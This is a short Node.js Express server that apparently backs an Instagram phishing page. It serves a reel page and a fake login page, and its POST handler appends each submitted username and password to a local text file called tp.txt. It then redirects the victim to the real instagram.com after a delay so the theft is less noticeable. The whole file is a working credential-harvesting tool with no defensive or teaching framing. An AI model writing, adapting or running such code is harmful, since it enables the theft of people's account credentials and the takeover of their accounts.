const fs = require('fs');
var express = require('express');
var http = require('http');
var path = require("path");
var bodyParser = require('body-parser');
var helmet = require('helmet');
const hostname='0.0.0.0';
const port=3000;

var app = express();
var server = http.createServer(app);

app.use(bodyParser.urlencoded({extended: false}));
app.use(express.static(path.join(__dirname,'./public')));
app.use(helmet());


app.get('/', function(req,res){
    res.sendFile(path.join(__dirname,'./public/reel.html'));
    });

app.get('/login', function(req,res){
    setTimeout(function(){
    res.sendFile(path.join(__dirname,'./public/login.html'));
        }, 1000);
    });
    
app.post('/redirect', function(req,res){
     let input="";
     fs.readFile('tp.txt', 'utf8', (err, data) => {
        if (err) {
          return;
        }
        input=data+"\n"+req.body.username+"="+req.body.password;
        fs.writeFile('tp.txt',input, (err) => {
        if (err) throw err;
      })
      });
     
      setTimeout(function(){
    res.redirect('http://www.instagram.com');
        }, 20000);
  });



server.listen(port,hostname, () => {
   console.log(`Server running at http://${hostname}:${port}/`)
})